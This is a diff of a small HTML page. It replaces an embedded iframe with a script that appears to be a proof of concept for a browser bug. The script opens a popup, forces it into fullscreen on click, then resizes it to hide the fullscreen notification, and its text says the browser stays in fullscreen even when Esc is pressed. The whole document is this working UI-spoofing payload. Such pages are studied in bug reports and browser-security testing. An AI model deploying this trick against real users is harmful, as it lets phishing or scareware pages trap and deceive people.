@@ -1,5 +1,16 @@
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
-<iframe src="https://storage.googleapis.com/sourc7/fullscreen1/child1.html" width="100%" height="100%" allowfullscreen="yes"></iframe>
-</div>
+
+<script>
+function spoof(popupWindow) {
+        popupWindow.resizeBy(5000,500) // Try to increase X offset value if fullscreen notification still appear
+        popupWindow.document.write("Try press \"esc\" multiple times. The browser will stay persist in the fullscreen mode.")
+}
+
+function launch() {
+    var popupWindow = window.open("", "", "width=500;height=500")
+    popupWindow.document.body.innerText = "Click anywhere on the page"
+    popupWindow.document.onclick = function () { popupWindow.document.documentElement.requestFullscreen();  }
+    popupWindow.document.onfullscreenchange = function() { spoof(popupWindow); }
+}
+</script>
+
+<button onclick="launch()">Launch</button>
